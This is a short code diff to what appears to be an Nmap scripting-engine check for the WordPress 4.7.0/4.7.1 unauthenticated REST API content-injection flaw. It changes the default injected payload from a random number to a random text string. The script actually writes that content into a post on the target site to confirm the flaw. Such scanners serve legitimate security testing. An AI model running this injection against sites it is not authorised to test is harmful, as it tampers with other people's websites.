@@ -133,7 +133,7 @@ Unpatched versions of WordPress versions 4.7.0 and 4.7.1 allow unauthenticated u
   if stdnse.get_script_args(SCRIPT_NAME .. ".payload") then
     Payload = stdnse.get_script_args(SCRIPT_NAME .. ".payload")
   else
-    Payload = math.random(100000000)
+    Payload = stdnse.generate_random_string(math.random(50), "0123456789 abcdefghijklmnoprstuvzxwyABCDEFGHIJKLMNOPRSTUVZXWY")
   end
   stdnse.verbose1("Random PostID: %d", PostID)
   local VulnStatus = InjectContent(host, port, API, PostID, Payload)
